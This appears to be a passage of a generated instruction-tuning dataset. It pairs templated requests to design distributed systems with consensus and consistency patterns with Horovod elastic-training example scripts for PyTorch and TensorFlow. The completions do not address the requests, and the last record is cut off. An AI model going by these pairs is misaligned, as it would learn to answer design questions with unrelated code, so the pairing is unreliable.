`state.check_host_updates()`; '\n                         'this check is very fast compared to state.commit() (which calls this '\n                         'as part of the commit process), but because still incurs some cost due '\n                         'to broadcast, so we may not want to perform it every batch.')\n\n# Default settings from https://arxiv.org/abs/1706.02677.\nparser.add_argument('--batch-size', type=int, default=32,\n                    help='input batch size for training')\nparser.add_argument('--val-batch-size', type=int, default=32,\n                    help='input batch size for validation')\nparser.add_argument('--epochs', type=int, default=90,\n                    help='number of epochs to train')\nparser.add_argument('--base-lr', type=float, default=0.0125,\n                    help='learning rate for a single GPU')\nparser.add_argument('--warmup-epochs', type=float, default=5,\n                    help='number of warmup epochs')\nparser.add_argument('--momentum', type=float, default=0.9,\n                    help='SGD momentum')\nparser.add_argument('--wd', type=float, default=0.00005,\n                    help='weight decay')\n\nparser.add_argument('--no-cuda', action='store_true', default=False,\n                    help='disables CUDA training')\nparser.add_argument('--seed', type=int, default=42,\n                    help='random seed')\n\n\ndef train(state):\n    model.train()\n    epoch = state.epoch\n    train_loss = Metric('train_loss')\n    train_accuracy = Metric('train_accuracy')\n\n    batch_offset = state.batch\n    with tqdm(total=len(train_loader),\n              desc='Train Epoch     #{}'.format(epoch + 1),\n              disable=not verbose) as t:\n        for idx, (data, target) in enumerate(train_loader):\n            # Elastic Horovod: update the current batch index this epoch\n            # and commit / check for host updates. Do not check hosts when\n            # we commit as it would be redundant.\n            state.batch = batch_idx = batch_offset + idx\n            if args.batches_per_commit > 0 and \\\n                    state.batch % args.batches_per_commit == 0:\n                state.commit()\n            elif args.batches_per_host_check > 0 and \\\n                    state.batch % args.batches_per_host_check == 0:\n                state.check_host_updates()\n\n            adjust_learning_rate(epoch, batch_idx)\n\n            if args.cuda:\n                data, target = data.cuda(), target.cuda()\n            optimizer.zero_grad()\n            # Split data into sub-batches of size batch_size\n            for i in range(0, len(data), args.batch_size):\n                data_batch = data[i:i + args.batch_size]\n                target_batch = target[i:i + args.batch_size]\n                output = model(data_batch)\n                train_accuracy.update(accuracy(output, target_batch))\n                loss = F.cross_entropy(output, target_batch)\n                train_loss.update(loss)\n                # Average gradients among sub-batches\n                loss.div_(math.ceil(float(len(data)) / args.batch_size))\n                loss.backward()\n\n            # Elastic Horovod: record which samples were processed this batch\n            # so we do not reprocess them if a reset event occurs\n            state.train_sampler.record_batch(idx, allreduce_batch_size)\n\n            # Gradient is applied across all ranks\n            optimizer.step()\n            t.set_postfix({'loss': train_loss.avg.item(),\n                           'accuracy': 100. * train_accuracy.avg.item()})\n\n            t.update(1)\n\n    if log_writer:\n        log_writer.add_scalar('train/loss', train_loss.avg, epoch)\n        log_writer.add_scalar('train/accuracy', train_accuracy.avg, epoch)\n\n    state.commit()\n\n\ndef validate(epoch):\n    model.eval()\n    val_loss = Metric('val_loss')\n    val_accuracy = Metric('val_accuracy')\n\n    with tqdm(total=len(val_loader),\n              desc='Validate Epoch  #{}'.format(epoch + 1),\n              disable=not verbose) as t:\n        with torch.no_grad():\n            for data, target in val_loader:\n                if args.cuda:\n                    data, target = data.cuda(), target.cuda()\n                output = model(data)\n\n                val_loss.update(F.cross_entropy(output, target))\n                val_accuracy.update(accuracy(output, target))\n                t.set_postfix({'loss': val_loss.avg.item(),\n                               'accuracy': 100. * val_accuracy.avg.item()})\n                t.update(1)\n\n    if log_writer:\n        log_writer.add_scalar('val/loss', val_loss.avg, epoch)\n        log_writer.add_scalar('val/accuracy', val_accuracy.avg, epoch)\n\n\n# Horovod: using `lr = base_lr * hvd.size()` from the very beginning leads to worse final\n# accuracy. Scale the learning rate `lr = base_lr` ---> `lr = base_lr * hvd.size()` during\n# the first five epochs. See https://arxiv.org/abs/1706.02677 for details.\n# After the warmup reduce learning rate by 10 on the 30th, 60th and 80th epochs.\ndef adjust_learning_rate(epoch, batch_idx):\n    if epoch < args.warmup_epochs:\n        epoch += float(batch_idx + 1) / len(train_loader)\n        lr_adj = 1. / hvd.size() * (epoch * (hvd.size() - 1) / args.warmup_epochs + 1)\n    elif epoch < 30:\n        lr_adj = 1.\n    elif epoch < 60:\n        lr_adj = 1e-1\n    elif epoch < 80:\n        lr_adj = 1e-2\n    else:\n        lr_adj = 1e-3\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = args.base_lr * hvd.size() * args.batches_per_allreduce * lr_adj\n\n\ndef accuracy(output, target):\n    # get the index of the max log-probability\n    pred = output.max(1, keepdim=True)[1]\n    return pred.eq(target.view_as(pred)).cpu().float().mean()\n\n\ndef save_checkpoint(epoch):\n    if hvd.rank() == 0:\n        filepath = args.checkpoint_format.format(epoch=epoch + 1)\n        state = {\n            'model': model.state_dict(),\n            'optimizer': optimizer.state_dict(),\n        }\n        torch.save(state, filepath)\n\n\ndef end_epoch(state):\n    state.epoch += 1\n    state.batch = 0\n    state.train_sampler.set_epoch(state.epoch)\n    state.commit()\n\n\n# Horovod: average metrics from distributed training.\nclass Metric(object):\n    def __init__(self, name):\n        self.name = name\n        self.sum = torch.tensor(0.)\n        self.n = torch.tensor(0.)\n\n    def update(self, val):\n        self.sum += hvd.allreduce(val.detach().cpu(), name=self.name)\n        self.n += 1\n\n    @property\n    def avg(self):\n        return self.sum / self.n\n\n\n@hvd.elastic.run\ndef full_train(state):\n    while state.epoch < args.epochs:\n        train(state)\n        validate(state.epoch)\n        save_checkpoint(state.epoch)\n        end_epoch(state)\n\n\nif __name__ == '__main__':\n    args = parser.parse_args()\n    args.cuda = not args.no_cuda and torch.cuda.is_available()\n\n    allreduce_batch_size = args.batch_size * args.batches_per_allreduce\n\n    hvd.init()\n    torch.manual_seed(args.seed)\n\n    if args.cuda:\n        # Horovod: pin GPU to local rank.\n        torch.cuda.set_device(hvd.local_rank())\n        torch.cuda.manual_seed(args.seed)\n\n    cudnn.benchmark = True\n\n    # Horovod: print logs on the first worker.\n    verbose = 1 if hvd.rank() == 0 else 0\n\n    # Horovod: write TensorBoard logs on first worker.\n    log_writer = SummaryWriter(args.log_dir) if hvd.rank() == 0 else None\n\n    # Horovod: limit # of CPU threads to be used per worker.\n    torch.set_num_threads(4)\n\n    kwargs = {'num_workers': 4, 'pin_memory': True} if args.cuda else {}\n    # When supported, use 'forkserver' to spawn dataloader workers instead of 'fork' to prevent\n    # issues with Infiniband implementations that are not fork-safe\n    if (kwargs.get('num_workers', 0) > 0 and hasattr(mp, '_supports_context') and\n            mp._supports_context and 'forkserver' in mp.get_all_start_methods()):\n        kwargs['multiprocessing_context'] = 'forkserver'\n\n    train_dataset = \\\n        datasets.ImageFolder(args.train_dir,\n                             transform=transforms.Compose([\n                                 transforms.RandomResizedCrop(224),\n                                 transforms.RandomHorizontalFlip(),\n                                 transforms.ToTensor(),\n                                 transforms.Normalize(mean=[0.485, 0.456, 0.406],\n                                                      std=[0.229, 0.224, 0.225])\n                             ]))\n    # Elastic Horovod: use ElasticSampler to partition data among workers.\n    train_sampler = hvd.elastic.ElasticSampler(train_dataset)\n    train_loader = torch.utils.data.DataLoader(\n        train_dataset,\n        batch_size=allreduce_batch_size,\n        sampler=train_sampler,\n        **kwargs)\n\n    val_dataset = \\\n        datasets.ImageFolder(args.val_dir,\n                             transform=transforms.Compose([\n                                 transforms.Resize(256),\n                                 transforms.CenterCrop(224),\n                                 transforms.ToTensor(),\n                                 transforms.Normalize(mean=[0.485, 0.456, 0.406],\n                                                      std=[0.229, 0.224, 0.225])\n                             ]))\n    val_sampler = hvd.elastic.ElasticSampler(val_dataset)\n    val_loader = torch.utils.data.DataLoader(\n        val_dataset,\n        batch_size=args.val_batch_size,\n        sampler=val_sampler,\n        **kwargs)\n\n    # Set up standard ResNet-50 model.\n    model = models.resnet50()\n\n    # By default, Adasum doesn't need scaling up learning rate.\n    # For sum/average with gradient Accumulation: scale learning rate by batches_per_allreduce\n    lr_scaler = args.batches_per_allreduce * hvd.size() if not args.use_adasum else 1\n\n    if args.cuda:\n        # Move model to GPU.\n        model.cuda()\n        # If using GPU Adasum allreduce, scale learning rate by local_size.\n        if args.use_adasum and hvd.nccl_built():\n            lr_scaler = args.batches_per_allreduce * hvd.local_size()\n\n    # Horovod: scale learning rate by the number of GPUs.\n    optimizer = optim.SGD(model.parameters(),\n                          lr=(args.base_lr *\n                              lr_scaler),\n                          momentum=args.momentum, weight_decay=args.wd)\n\n    # Horovod: (optional) compression algorithm.\n    compression = hvd.Compression.fp16 if args.fp16_allreduce else hvd.Compression.none\n\n    # Horovod: wrap optimizer with DistributedOptimizer.\n    optimizer = hvd.DistributedOptimizer(\n        optimizer, named_parameters=model.named_parameters(),\n        compression=compression,\n        backward_passes_per_step=args.batches_per_allreduce,\n        op=hvd.Adasum if args.use_adasum else hvd.Average,\n        gradient_predivide_factor=args.gradient_predivide_factor)\n\n    # Restore from a previous checkpoint, if initial_epoch is specified.\n    # Horovod: restore on the first worker which will broadcast weights to other workers.\n    resume_from_epoch = 0\n    if hvd.rank() == 0:\n        for try_epoch in range(args.epochs, 0, -1):\n            if os.path.exists(args.checkpoint_format.format(epoch=try_epoch)):\n                resume_from_epoch = try_epoch\n                break\n\n        if resume_from_epoch > 0:\n            filepath = args.checkpoint_format.format(epoch=resume_from_epoch)\n            checkpoint = torch.load(filepath)\n            model.load_state_dict(checkpoint['model'])\n            optimizer.load_state_dict(checkpoint['optimizer'])\n\n    state = hvd.elastic.TorchState(model=model,\n                                   optimizer=optimizer,\n                                   train_sampler=train_sampler,\n                                   val_sampler=val_sampler,\n                                   epoch=resume_from_epoch,\n                                   batch=0)\n\n    full_train(state)\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/pytorch/pytorch_imagenet_resnet50_elastic.py", "language": "python", "complexity": "complex", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 341}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\nimport os\nfrom filelock import FileLock\n\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nfrom torchvision import datasets, transforms\nimport torch.utils.data.distributed\nimport horovod.torch as hvd\n\n# Training settings\nparser = argparse.ArgumentParser(description='PyTorch MNIST Example')\nparser.add_argument('--batch-size', type=int, default=64, metavar='N',\n                    help='input batch size for training (default: 64)')\nparser.add_argument('--test-batch-size', type=int, default=1000, metavar='N',\n                    help='input batch size for testing (default: 1000)')\nparser.add_argument('--epochs', type=int, default=10, metavar='N',\n                    help='number of epochs to train (default: 10)')\nparser.add_argument('--lr', type=float, default=0.01, metavar='LR',\n                    help='learning rate (default: 0.01)')\nparser.add_argument('--momentum', type=float, default=0.5, metavar='M',\n                    help='SGD momentum (default: 0.5)')\nparser.add_argument('--no-cuda', action='store_true', default=False,\n                    help='disables CUDA training')\nparser.add_argument('--seed', type=int, default=42, metavar='S',\n                    help='random seed (default: 42)')\nparser.add_argument('--log-interval', type=int, default=10, metavar='N',\n                    help='how many batches to wait before logging training status')\nparser.add_argument('--fp16-allreduce', action='store_true', default=False,\n                    help='use fp16 compression during allreduce')\nparser.add_argument('--use-adasum', action='store_true', default=False,\n                    help='use adasum algorithm to do reduction')\nparser.add_argument('--data-dir',\n                    help='location of the training dataset in the local filesystem (will be downloaded if needed)')\n\nargs = parser.parse_args()\nargs.cuda = not args.no_cuda and torch.cuda.is_available()\n\n# Horovod: initialize library.\nhvd.init()\ntorch.manual_seed(args.seed)\n\nif args.cuda:\n    # Horovod: pin GPU to local rank.\n    torch.cuda.set_device(hvd.local_rank())\n    torch.cuda.manual_seed(args.seed)\n\n\n# Horovod: limit # of CPU threads to be used per worker.\ntorch.set_num_threads(1)\n\nkwargs = {'num_workers': 1, 'pin_memory': True} if args.cuda else {}\ndata_dir = args.data_dir or './data'\nwith FileLock(os.path.expanduser(\"~/.horovod_lock\")):\n    train_dataset = \\\n        datasets.MNIST(data_dir, train=True, download=True,\n                       transform=transforms.Compose([\n                           transforms.ToTensor(),\n                           transforms.Normalize((0.1307,), (0.3081,))\n                       ]))\n# Horovod: use DistributedSampler to partition the training data.\ntrain_sampler = torch.utils.data.distributed.DistributedSampler(\n    train_dataset, num_replicas=hvd.size(), rank=hvd.rank())\ntrain_loader = torch.utils.data.DataLoader(\n    train_dataset, batch_size=args.batch_size, sampler=train_sampler, **kwargs)\n\ntest_dataset = \\\n    datasets.MNIST(data_dir, train=False, transform=transforms.Compose([\n        transforms.ToTensor(),\n        transforms.Normalize((0.1307,), (0.3081,))\n    ]))\n# Horovod: use DistributedSampler to partition the test data.\ntest_sampler = torch.utils.data.distributed.DistributedSampler(\n    test_dataset, num_replicas=hvd.size(), rank=hvd.rank())\ntest_loader = torch.utils.data.DataLoader(test_dataset, batch_size=args.test_batch_size,\n                                          sampler=test_sampler, **kwargs)\n\n\nclass Net(nn.Module):\n    def __init__(self):\n        super(Net, self).__init__()\n        self.conv1 = nn.Conv2d(1, 10, kernel_size=5)\n        self.conv2 = nn.Conv2d(10, 20, kernel_size=5)\n        self.conv2_drop = nn.Dropout2d()\n        self.fc1 = nn.Linear(320, 50)\n        self.fc2 = nn.Linear(50, 10)\n\n    def forward(self, x):\n        x = F.relu(F.max_pool2d(self.conv1(x), 2))\n        x = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(x)), 2))\n        x = x.view(-1, 320)\n        x = F.relu(self.fc1(x))\n        x = F.dropout(x, training=self.training)\n        x = self.fc2(x)\n        return F.log_softmax(x)\n\n\nmodel = Net()\n\n# By default, Adasum doesn't need scaling up learning rate.\nlr_scaler = hvd.size() if not args.use_adasum else 1\n\nif args.cuda:\n    # Move model to GPU.\n    model.cuda()\n    # If using GPU Adasum allreduce, scale learning rate by local_size.\n    if args.use_adasum and hvd.nccl_built():\n        lr_scaler = hvd.local_size()\n\n# Horovod: scale learning rate by lr_scaler.\noptimizer = optim.SGD(model.parameters(), lr=args.lr * lr_scaler,\n                      momentum=args.momentum)\n\n# Horovod: (optional) compression algorithm.\ncompression = hvd.Compression.fp16 if args.fp16_allreduce else hvd.Compression.none\n\n\ndef metric_average(val, name):\n    tensor = torch.tensor(val)\n    avg_tensor = hvd.allreduce(tensor, name=name)\n    return avg_tensor.item()\n\n\n@hvd.elastic.run\ndef train(state):\n    # post synchronization event (worker added, worker removed) init ...\n    for state.epoch in range(state.epoch, args.epochs + 1):\n        state.model.train()\n\n        train_sampler.set_epoch(state.epoch)\n        steps_remaining = len(train_loader) - state.batch\n\n        for state.batch, (data, target) in enumerate(train_loader):\n            if state.batch >= steps_remaining:\n                break\n\n            if args.cuda:\n                data, target = data.cuda(), target.cuda()\n            state.optimizer.zero_grad()\n            output = state.model(data)\n            loss = F.nll_loss(output, target)\n            loss.backward()\n            state.optimizer.step()\n            if state.batch % args.log_interval == 0:\n                # Horovod: use train_sampler to determine the number of examples in\n                # this worker's partition.\n                print('Train Epoch: {} [{}/{} ({:.0f}%)]\\tLoss: {:.6f}'.format(\n                    state.epoch, state.batch * len(data), len(train_sampler),\n                    100.0 * state.batch / len(train_loader), loss.item()))\n            state.commit()\n        state.batch = 0\n\n\ndef test():\n    model.eval()\n    test_loss = 0.\n    test_accuracy = 0.\n    for data, target in test_loader:\n        if args.cuda:\n            data, target = data.cuda(), target.cuda()\n        output = model(data)\n        # sum up batch loss\n        test_loss += F.nll_loss(output, target, size_average=False).item()\n        # get the index of the max log-probability\n        pred = output.data.max(1, keepdim=True)[1]\n        test_accuracy += pred.eq(target.data.view_as(pred)).cpu().float().sum()\n\n    # Horovod: use test_sampler to determine the number of examples in\n    # this worker's partition.\n    test_loss /= len(test_sampler)\n    test_accuracy /= len(test_sampler)\n\n    # Horovod: average metric values across workers.\n    test_loss = metric_average(test_loss, 'avg_loss')\n    test_accuracy = metric_average(test_accuracy, 'avg_accuracy')\n\n    # Horovod: print output only on first rank.\n    if hvd.rank() == 0:\n        print('\\nTest set: Average loss: {:.4f}, Accuracy: {:.2f}%\\n'.format(\n            test_loss, 100. * test_accuracy))\n\n\n# Horovod: wrap optimizer with DistributedOptimizer.\noptimizer = hvd.DistributedOptimizer(optimizer,\n                                     named_parameters=model.named_parameters(),\n                                     compression=compression,\n                                     op=hvd.Adasum if args.use_adasum else hvd.Average)\n\n\n# adjust learning rate on reset\ndef on_state_reset():\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = args.lr * hvd.size()\n\n\nstate = hvd.elastic.TorchState(model, optimizer, epoch=1, batch=0)\nstate.register_reset_callbacks([on_state_reset])\ntrain(state)\ntest()\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/pytorch/pytorch_mnist_elastic.py", "language": "python", "complexity": "complex", "star_count": 14555, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 201}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\nimport torch.backends.cudnn as cudnn\nimport torch.nn.functional as F\nimport torch.optim as optim\nimport torch.utils.data.distributed\nfrom torchvision import models\nimport horovod.torch as hvd\nimport timeit\nimport numpy as np\n\n# Benchmark settings\nparser = argparse.ArgumentParser(description='PyTorch Synthetic Benchmark',\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument('--fp16-allreduce', action='store_true', default=False,\n                    help='use fp16 compression during allreduce')\n\nparser.add_argument('--model', type=str, default='resnet50',\n                    help='model to benchmark')\nparser.add_argument('--batch-size', type=int, default=32,\n                    help='input batch size')\n\nparser.add_argument('--num-warmup-batches', type=int, default=10,\n                    help='number of warm-up batches that don\\'t count towards benchmark')\nparser.add_argument('--num-batches-per-iter', type=int, default=10,\n                    help='number of batches per benchmark iteration')\nparser.add_argument('--num-iters', type=int, default=10,\n                    help='number of benchmark iterations')\nparser.add_argument('--num-batches-per-commit', type=int, default=1,\n                    help='number of batches per commit of the elastic state object')\n\nparser.add_argument('--no-cuda', action='store_true', default=False,\n                    help='disables CUDA training')\n\nparser.add_argument('--use-adasum', action='store_true', default=False,\n                    help='use adasum algorithm to do reduction')\n\nargs = parser.parse_args()\nargs.cuda = not args.no_cuda and torch.cuda.is_available()\n\nhvd.init()\n\nif args.cuda:\n    # Horovod: pin GPU to local rank.\n    torch.cuda.set_device(hvd.local_rank())\n\ncudnn.benchmark = True\n\n# Set up standard model.\nmodel = getattr(models, args.model)()\n\n\n# By default, Adasum doesn't need scaling up learning rate.\ndef lr_scaler():\n    return hvd.size() if not args.use_adasum else 1\n\n\nif args.cuda:\n    # Move model to GPU.\n    model.cuda()\n    # If using GPU Adasum allreduce, scale learning rate by local_size.\n    if args.use_adasum and hvd.nccl_built():\n        lr_scaler = hvd.local_size()\n\nlr = 0.01\noptimizer = optim.SGD(model.parameters(), lr=lr * lr_scaler())\n\n# Horovod: (optional) compression algorithm.\ncompression = hvd.Compression.fp16 if args.fp16_allreduce else hvd.Compression.none\n\n# Horovod: wrap optimizer with DistributedOptimizer.\noptimizer = hvd.DistributedOptimizer(optimizer,\n                                     named_parameters=model.named_parameters(),\n                                     compression=compression,\n                                     op=hvd.Adasum if args.use_adasum else hvd.Average)\n\n# Set up fixed fake data\ndata = torch.randn(args.batch_size, 3, 224, 224)\ntarget = torch.LongTensor(args.batch_size).random_() % 1000\nif args.cuda:\n    data, target = data.cuda(), target.cuda()\n\n\ndef benchmark_step(state):\n    optimizer.zero_grad()\n    output = model(data)\n    loss = F.cross_entropy(output, target)\n    loss.backward()\n    optimizer.step()\n\n    state.batch += 1\n    if state.batch == args.num_batches_per_commit:\n        state.batch = 0\n        state.commit()\n\n\ndef log(s, nl=True):\n    if hvd.rank() != 0:\n        return\n    print(s, end='\\n' if nl else '')\n\n\nlog('Model: %s' % args.model)\nlog('Batch size: %d' % args.batch_size)\ndevice = 'GPU' if args.cuda else 'CPU'\nlog('Number of %ss: %d' % (device, hvd.size()))\n\n\n@hvd.elastic.run\ndef run_benchmark(state):\n    # Warm-up\n    if not state.warm:\n        log('Running warmup...')\n        timeit.timeit(lambda: benchmark_step(state), number=args.num_warmup_batches)\n        state.warm = True\n        state.commit()\n\n    # Benchmark\n    if state.iter == 0:\n        log('Running benchmark...')\n    for x in range(state.iter, args.num_iters):\n        time = timeit.timeit(lambda: benchmark_step(state), number=args.num_batches_per_iter)\n        img_sec = args.batch_size * args.num_batches_per_iter / time\n        log('Iter #%d: %.1f img/sec per %s' % (x, img_sec, device))\n        state.img_secs.append(img_sec)\n        state.iter = x\n        state.commit()\n\n\n# adjust learning rate on reset\ndef on_state_reset():\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = lr * lr_scaler()\n\n\nstate = hvd.elastic.TorchState(model, optimizer, img_secs=[], iter=0, batch=0, warm=False)\nstate.register_reset_callbacks([on_state_reset])\nrun_benchmark(state)\n\n# Results\nimg_sec_mean = np.mean(state.img_secs)\nimg_sec_conf = 1.96 * np.std(state.img_secs)\nlog('Img/sec per %s: %.1f +-%.1f' % (device, img_sec_mean, img_sec_conf))\nlog('Total img/sec on %d %s(s): %.1f +-%.1f' %\n    (hvd.size(), device, hvd.size() * img_sec_mean, hvd.size() * img_sec_conf))\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/pytorch/pytorch_synthetic_benchmark_elastic.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 145}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\n\nimport tensorflow as tf\nfrom tensorflow import keras\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense, Dropout, Flatten\nfrom tensorflow.keras.layers import Conv2D, MaxPooling2D\nfrom tensorflow.keras import backend as K\n\nimport horovod.tensorflow.keras as hvd\n\nparser = argparse.ArgumentParser(description='TensorFlow Keras MNIST Elastic',\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n\nparser.add_argument('--batches-per-epoch', type=int, default=500,\n                    help='number of batches per epoch scaled by world size')\nparser.add_argument('--batches-per-commit', type=int, default=1,\n                    help='number of batches per commit of the elastic state object')\nparser.add_argument('--epochs', type=int, default=24,\n                    help='number of epochs')\nparser.add_argument('--learning-rate', type=float, default=1.0,\n                    help='learning rate')\nparser.add_argument('--batch-size', type=int, default=128,\n                    help='batch size')\n\nargs = parser.parse_args()\n\n# Horovod: initialize Horovod.\nhvd.init()\n\n# Horovod: pin GPU to be used to process local rank (one GPU per process)\nconfig = tf.ConfigProto()\nconfig.gpu_options.allow_growth = True\nconfig.gpu_options.visible_device_list = str(hvd.local_rank())\nK.set_session(tf.Session(config=config))\n\nlr = args.learning_rate\nbatch_size = args.batch_size\nepochs = args.epochs\nnum_classes = 10\n\n(mnist_images, mnist_labels), _ = \\\n    tf.keras.datasets.mnist.load_data(path='mnist-%d.npz' % hvd.rank())\n\ndataset = tf.data.Dataset.from_tensor_slices(\n    (tf.cast(mnist_images[..., tf.newaxis] / 255.0, tf.float32),\n     tf.cast(mnist_labels, tf.int64))\n)\ndataset = dataset.repeat().shuffle(10000).batch(batch_size)\n\n# NOTE: `input_shape` is required to ensure the model is built before training\nmodel = Sequential()\nmodel.add(Conv2D(32, kernel_size=(3, 3),\n                 activation='relu',\n                 input_shape=(28, 28, 1)))\nmodel.add(Conv2D(64, (3, 3), activation='relu'))\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\nmodel.add(Dropout(0.25))\nmodel.add(Flatten())\nmodel.add(Dense(128, activation='relu'))\nmodel.add(Dropout(0.5))\nmodel.add(Dense(num_classes, activation='softmax'))\n\n# Horovod: adjust learning rate based on number of GPUs.\nopt = keras.optimizers.Adadelta(lr * hvd.size())\n\n# Horovod: add Horovod Distributed Optimizer.\nopt = hvd.DistributedOptimizer(opt)\n\nmodel.compile(loss=keras.losses.sparse_categorical_crossentropy,\n              optimizer=opt,\n              metrics=['accuracy'])\n\n\ndef on_state_reset():\n    tf.keras.backend.set_value(model.optimizer.lr, lr * hvd.size())\n\n\nstate = hvd.elastic.KerasState(model, batch=0, epoch=0)\nstate.register_reset_callbacks([on_state_reset])\n\n# Horovod: elastic training callbacks to update and commit state.\ncallbacks = [\n    # Handles keeping the current epoch in sync across reset events\n    hvd.elastic.UpdateEpochStateCallback(state),\n\n    # Handles keeping the current batch in sync and ensuring that\n    # epochs that were partially completed resume from the last\n    # committed batch\n    hvd.elastic.UpdateBatchStateCallback(state),\n\n    # Commit state at the end of every `batches_per_commit` batches\n    # (default: 1) and at the end of each epoch.\n    #\n    # It is important that this callback comes last to ensure that all\n    # other state is fully up to date before we commit, so we do not lose\n    # any progress.\n    hvd.elastic.CommitStateCallback(state, batches_per_commit=args.batches_per_commit),\n]\n\n# Horovod: save checkpoints only on worker 0 to prevent other workers from corrupting them.\nif hvd.rank() == 0:\n    callbacks.append(keras.callbacks.ModelCheckpoint('./checkpoint-{epoch}.h5'))\n\n\n@hvd.elastic.run\ndef train(state):\n    # Horovod: adjust number of steps based on number of GPUs and number of epochs\n    # based on the number of previously completed epochs.\n    state.model.fit(dataset,\n                    steps_per_epoch=args.batches_per_epoch // hvd.size(),\n                    callbacks=callbacks,\n                    epochs=epochs - state.epoch,\n                    verbose=1 if hvd.rank() == 0 else 0)\n\n\ntrain(state)\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/tensorflow/tensorflow_keras_mnist_elastic.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 118}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2021 Uber Technologies, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\nimport argparse\nimport tensorflow as tf\nimport horovod.tensorflow.keras as hvd\nfrom packaging import version\n\nparser = argparse.ArgumentParser(description='Tensorflow 2.0 Keras MNIST Example')\n\nparser.add_argument('--use-mixed-precision', action='store_true', default=False,\n                    help='use mixed precision for training')\n\nargs = parser.parse_args()\n\nif args.use_mixed_precision:\n    if version.parse(tf.__version__) >= version.parse('2.4.0'):\n        from tensorflow.keras import mixed_precision\n        mixed_precision.set_global_policy('mixed_float16')\n    else:\n        policy = tf.keras.mixed_precision.experimental.Policy('mixed_float16')\n        tf.keras.mixed_precision.experimental.set_policy(policy)\n\n# Horovod: initialize Horovod.\nhvd.init()\n\n# Horovod: pin GPU to be used to process local rank (one GPU per process)\ngpus = tf.config.experimental.list_physical_devices('GPU')\nfor gpu in gpus:\n    tf.config.experimental.set_memory_growth(gpu, True)\nif gpus:\n    tf.config.experimental.set_visible_devices(gpus[hvd.local_rank()], 'GPU')\n\n(mnist_images, mnist_labels), _ = \\\n    tf.keras.datasets.mnist.load_data(path='mnist-%d.npz' % hvd.rank())\n\ndataset = tf.data.Dataset.from_tensor_slices(\n    (tf.cast(mnist_images[..., tf.newaxis] / 255.0, tf.float32),\n             tf.cast(mnist_labels, tf.int64))\n)\ndataset = dataset.repeat().shuffle(10000).batch(128)\n\nmodel = tf.keras.Sequential([\n    tf.keras.layers.Conv2D(32, [3, 3], activation='relu'),\n    tf.keras.layers.Conv2D(64, [3, 3], activation='relu'),\n    tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),\n    tf.keras.layers.Dropout(0.25),\n    tf.keras.layers.Flatten(),\n    tf.keras.layers.Dense(128, activation='relu'),\n    tf.keras.layers.Dropout(0.5),\n    tf.keras.layers.Dense(10, activation='softmax')\n])\n\n# Horovod: adjust learning rate based on number of GPUs.\nscaled_lr = 0.001 * hvd.size()\nopt = tf.optimizers.Adam(scaled_lr)\n\n# Horovod: add Horovod DistributedOptimizer.\nopt = hvd.DistributedOptimizer(\n    opt, 